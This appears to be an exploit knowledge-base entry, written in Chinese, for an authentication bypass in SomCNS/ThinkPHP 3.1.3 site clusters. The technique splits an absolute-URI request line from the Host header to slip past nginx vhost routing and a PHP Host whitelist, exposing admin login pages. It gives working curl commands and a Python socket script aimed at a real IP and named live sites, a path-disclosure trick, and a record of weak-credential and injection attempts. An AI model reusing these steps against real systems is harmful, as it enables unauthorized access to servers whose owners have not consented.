# SomCNS/ThinkPHP3.1.3 站群：绝对URI request-target 与 Host 头分离，穿过 nginx vhost 路由 + PHP Host 白名单双层（后台登录面零凭证暴露）

- **code**: somcns-thinkphp3.1.3-站群-绝对uri-request-target-与-host-头分离-ngin
- **kind**: exp
- **category**: auth-bypass
- **component**: SomCNS 站群 CMS（ThinkPHP 3.1.3）CommonAction Host 白名单 + nginx/openresty vhost 路由
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-08 11:30–11:38（UTC+8）本机 Windows curl.exe -k --noproxy '*' 直连 70.36.96.166:443 实测（全程 --resolve 固定 SNI、带统一 UA）：① 基线 Host=品牌域 GET /Admin/Index/login → 302/0B Location:/（应用层 CommonAction 闸门）；② 仅把 Host 换成白名单 token → 503/596B openresty（该 vhost 不存在，证明 nginx 层按 Host 选站）；③ 请求行改成绝对 URI http://品牌域/Admin/Index/login + Host=白名单 token → 200/925B，Set-Cookie: PHPSESSID=...，title「后台登录 - 送钱宝宝」、banner「送钱宝宝-管理登录」by SomCNS，证明 nginx 按请求行主机名选 docroot、PHP 按 Host 头过白名单，两层同时通过；④ 同法对 5 个品牌 vhost 重复：919B（摇钱树）/919B（大白）/913B（战狼）/926B（澳彩大本营），均为 200 且页面互不相同；⑤ 用 /App/Lib/Action/Home/OrderAction.class.php/ 的 fatal error 回显证明 5 个 docroot 各自独立（/www/wwwroot/{thisuqs_com,bigwhite.com,jljlweb,sqbb.com,111189}）；⑥ 认证层未被击穿：8 组弱凭据 + 5 组登录注入全部 302→/Admin/Index/login，无会话建立。证据文件：D:\ARTEX\data\tasks\640\i12502（lg_*.html 五站登录页、fin.txt 决定性响应头）。
- **path**: pocs/somcns-thinkphp3.1.3-站群-绝对uri-request-target-与-host-头分离-ngin/somcns_abs_uri_host_split_admin_bypass.md
- **tags**: somcns,thinkphp3.1.3,host白名单,absolute-uri,request-target,curl,nginx,vhost路由,认证绕过,后台登录面,零凭证
- **created_at**: 2026-11-08T11:40:40.003Z
- **engine**: 70.36.96.166:443（同 IP 承载 5 套独立 SomCNS 站群部署，各自独立 vhost/docroot）
- **found_by**: vuln-scan

## 描述

SomCNS/ThinkPHP 3.1.3 站群有两层独立的主机判断：nginx/openresty 用「请求行里的主机名」选 vhost/docroot，PHP 的 CommonAction 用「Host 头」做子串白名单。当白名单 token 域名在该 IP 上没有 vhost 时，单改 Host 会 503；把 request-target 写成绝对 URI（http://品牌域/Admin/Index/login）同时保留 Host: <白名单 token>，即可让 nginx 路由到真实品牌站、又让 PHP 认为 Host 合法，零凭证打开真实后台登录页。适用于同 IP 多套站群、边缘/前置按 Host 选站导致「Host 绕过 503」的场景。

## 用法

```
前置：已知目标 IP 上至少一个真实品牌 vhost 域名（用于 SNI/请求行），以及一个能过 PHP 白名单的 Host 串（白名单可用 kb#466 的方法从模板渲染/静态文件里抠，形如 usertobbs.<品牌>.<随机>.top）。必须 HTTP/1.1（--http1.1），不要 HTTP/2；必须 --noproxy '*' 避免本机代理改写。

1) 基线（证明应用层闸门）：curl.exe -k -s --noproxy '*' --http1.1 -D - -o NUL --resolve "<品牌域>:443:<IP>" "https://<品牌域>/Admin/Index/login" → 期望 302/0B Location:/。
2) 仅改 Host（证明 nginx 层挡路）：同上请求加 -H "Host: <白名单token域>" → 期望 openresty 503/596B。
3) 分离双层（核心）：curl.exe -k -s --noproxy '*' --http1.1 -D - --resolve "<品牌域>:443:<IP>" --request-target "http://<品牌域>/Admin/Index/login" -H "Host: <白名单token域>" "https://<品牌域>/" → 期望 200 + 登录表单 + Set-Cookie: PHPSESSID。
4) 批量：把 <品牌域> 换成同 IP 上其它 vhost 域名重复第 3 步，各站应返回不同字节数的后台登录页。
判据：200 且正文含 name="username"/name="password" 与站点自有标题 = 打开真实后台；302/0B = 白名单没命中；503 = 请求行主机名不是该机 vhost；200 但内容异常 = 打到了 default vhost。
注意：--request-target 的 URL 用 http:// 前缀（即使实际走 TLS），host 部分必须是真实 vhost；不要用 --path-as-is 代替。
```

## 正文

```
# SomCNS / ThinkPHP 3.1.3 站群：绝对 URI request-target 与 Host 头分离，双穿 nginx vhost 与 PHP Host 白名单

## 一、原理

同一台机器上部署多套 SomCNS 站群时，最容易踩的坑是**两层主机判断对 Host 的用法不一致**：

| 层 | 依据 | 行为 |
|---|---|---|
| nginx / openresty | 请求行中的主机名（origin-form 时退化为 Host 头；absolute-form 时用请求行 URL 的 host） | 选择 server 块 / docroot；查不到 vhost 直接 503 |
| PHP（CommonAction::_initialize） | `HTTP_HOST`（即 Host 头） | 大小写敏感子串匹配白名单；不命中 → `302 Location: /`，0 字节 |

因此当白名单 token 域名（如 `usertobbs.thb.mysqbbthisgoodsfor33333user.top`）在该 IP 上**没有 vhost** 时：

- 只改 `Host: <白名单token域>` → nginx 503（Host 是唯一路由依据，找不到站）
- 只正常访问品牌域 → nginx 正常，但 PHP 看到品牌域不在白名单 → 302

把 request-target 写成 **absolute-form**（`GET http://<品牌域>/Admin/Index/login HTTP/1.1`）并把 `Host` 留成白名单 token，就能同时满足两层：nginx 用请求行里的 `<品牌域>` 选到正确 docroot，PHP 用 `Host` 头过白名单。**这不是 Host 头伪造，是 RFC 7230 允许的 absolute-form 请求目标造成的主机名解析分离。**

## 二、前置条件

1. 目标 IP 上至少有一个真实品牌 vhost 域名（用于 SNI 与 request-target 的 host 部分）。
2. 一个能通过 CommonAction 白名单的 Host 串（子串即可；获取方式见 kb#466：`Home/Order::get_html1` 烘焙后读 `App/Tpl/Home/Index_index.html`、或直读 `/Upload/atop/*.txt`，grep `https?://` 取高频站群域）。
3. 必须 HTTP/1.1；TLS 用 `--resolve` 固定 SNI，避免 DNS/代理把请求带到边缘。
4. curl 需支持 `--request-target`（7.55+）。

## 三、复现步骤（三步对照）

变量：`IP=70.36.96.166`、`BRAND=<品牌域>`、`WL=<白名单token域>`。

### Step 0 基线：证明闸门存在且在 PHP 层

```bash
curl.exe -k -s --noproxy '*' --http1.1 -D - -o NUL \
  --resolve "$BRAND:443:$IP" \
  "https://$BRAND/Admin/Index/login"
# 期望: HTTP/1.1 302 Moved Temporarily
#       Set-Cookie: PHPSESSID=...
#       Location: https://$BRAND/
#       Content-Length: 0
```

### Step 1 只换 Host：证明 nginx 层按主机名选站

```bash
curl.exe -k -s --noproxy '*' --http1.1 -D - -o NUL \
  --resolve "$BRAND:443:$IP" \
  -H "Host: $WL" \
  "https://$BRAND/Admin/Index/login"
# 期望: HTTP/1.1 503, ~596B
#       <center>openresty</center>   ← 该 vhost 不存在
```

### Step 2 分离双层：绝对 URI + 白名单 Host

```bash
curl.exe -k -s --noproxy '*' --http1.1 -D - \
  --resolve "$BRAND:443:$IP" \
  --request-target "http://$BRAND/Admin/Index/login" \
  -H "Host: $WL" \
  "https://$BRAND/"
# 期望: HTTP/1.1 200 OK, ~919B
#       Set-Cookie: PHPSESSID=...
#       <title>后台登录 - <站点名></title>
#       <input name="username"> <input name="password">
```

请求行实际发出的样子：

```http
GET http://<品牌域>/Admin/Index/login HTTP/1.1
Host: <白名单token域>
User-Agent: <统一UA>
Accept: */*
```

Python 原始实现（不依赖 curl 版本）：

```python
import ssl, socket
host_ip, brand, wl = "70.36.96.166", "sqbbx3f.example-brand.pro", "usertobbs.thb.mysqbbthisgoodsfor33333user.top"
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(socket.create_connection((host_ip, 443), 15), server_hostname=brand)
req = (f"GET http://{brand}/Admin/Index/login HTTP/1.1\r\n"
       f"Host: {wl}\r\nConnection: close\r\n\r\n")
s.sendall(req.encode())
buf = b""
while True:
    d = s.recv(65536)
    if not d: break
    buf += d
print(buf.decode("utf-8", "replace"))
```

### Step 3 批量确认同 IP 的多套部署

把 `$BRAND` 依次换成同 IP 上其它 vhost 域名重复 Step 2，每站应得到**内容不同**的后台登录页（标题含各自品牌名）。本次实测 5 套：919B / 919B / 913B / 926B / 926B，标题分属不同品牌，证明不是缓存或错页。

docroot 独立性佐证（零凭证、利用 ThinkPHP PATH_INFO 解析）：

```bash
curl.exe -k -s --noproxy '*' --http1.1 \
  --resolve "$BRAND:443:$IP" \
  --request-target "http://$BRAND/App/Lib/Action/Home/OrderAction.class.php/" \
  -H "Host: $WL" "https://$BRAND/" | grep -oE '/www/wwwroot/[A-Za-z0-9_.-]+'
# fatal error 回显每个站自己的 /www/wwwroot/<项目名>
```

## 四、判据速查

| 响应 | 含义 | 下一步 |
|---|---|---|
| 302 / 0B / Location: / | PHP 白名单未命中 | 换白名单串；确认大小写 |
| 503 / openresty 短页 | 请求行主机名不是该机 vhost | 换同 IP 已知品牌域 |
| 200 + 登录表单 + PHPSESSID | 双层均通过，真实后台登录页 | 记录并评估认证面 |
| 200 + 非目标站内容 | 落到 default vhost | request-target 的 host 写错 |
| 400 Bad Request | 用了 HTTP/2 或畸形绝对 URI | 强制 --http1.1 |

## 五、失败时的常见原因

1. **用 HTTP/2**：h2 没有请求行，`:path` 不接受 absolute-form，会 400/421。必须 `--http1.1`。
2. **--request-target 写了 https://**：请求行应是 `http://host/path`（scheme 与 TLS 无关），写成 https 部分前置会拒。
3. **Host 大小写或拼写不对**：CommonAction 是 `strpos` 大小写敏感子串匹配，一个字符不对即 302。
4. **request-target 的 host 用了白名单 token 域**：那又回到 nginx 503；host 必须是该 IP 上真实存在的 vhost 域名。
5. **走了代理/DNS 解析**：请求会被带到边缘或错误节点，务必 `--noproxy '*'` + `--resolve`。
6. **把 200/登录页当成已进后台**：本手法只解第一层（入口可见）。登录态校验完好——本次 8 组弱凭据与 5 组注入全部 302→login，未取得会话。登录页无验证码无频控只是提高了在线验证价值，不等于认证被绕过。

## 六、适用范围与关联

- 适用于 nginx/openresty 按请求行主机名选 vhost、而上层应用按 `Host` 头做主机白名单的任意组合；不限于 SomCNS。
- 与 kb#466 的区别：kb#466 是「源站 nginx 不按主机名分流，随便一个 Host 就能过 PHP 闸门」；本条是「前置按主机名分流，必须用 absolute-form 把 nginx 的路由主机与 PHP 的校验主机拆开」。遇到「只改 Host 变 503」时不要再判死，先做本条 Step 2。

```
